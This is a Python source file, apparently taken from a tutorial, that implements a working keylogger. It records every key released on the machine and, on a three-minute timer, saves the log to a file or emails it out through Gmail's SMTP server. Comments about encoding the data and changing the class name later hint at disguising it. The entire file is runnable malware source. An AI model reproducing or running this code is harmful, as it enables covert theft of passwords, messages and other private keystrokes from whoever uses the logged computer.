# src: https://www.thepythoncode.com/article/write-a-keylogger-python
import keyboard
import smtplib
from threading import Timer
from datetime import datetime

# SETUP:
DELAY = 180
MAIL = "your-address@gmail.com"
MAIL_PASS = "your-password"
# To do: encode this data later.

# Keylogger: Change this name later.
class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        # Autorun:
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"log-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as fl:
            print(self.log, file=fl)
        print(f"[+] {self.filename}.txt saved!")

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(MAIL, MAIL_PASS, self.log)
            elif self.report_method == "file":
                self.report_to_file()
        self.start_dt = datetime.now()
        self.log =  ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    # For email reports:
    #keylogger = Keylogger(interval=DELAY, report_method="email")
    # For local saves:
    keylogger = Keylogger(interval=DELAY, report_method="file")
    keylogger.start()

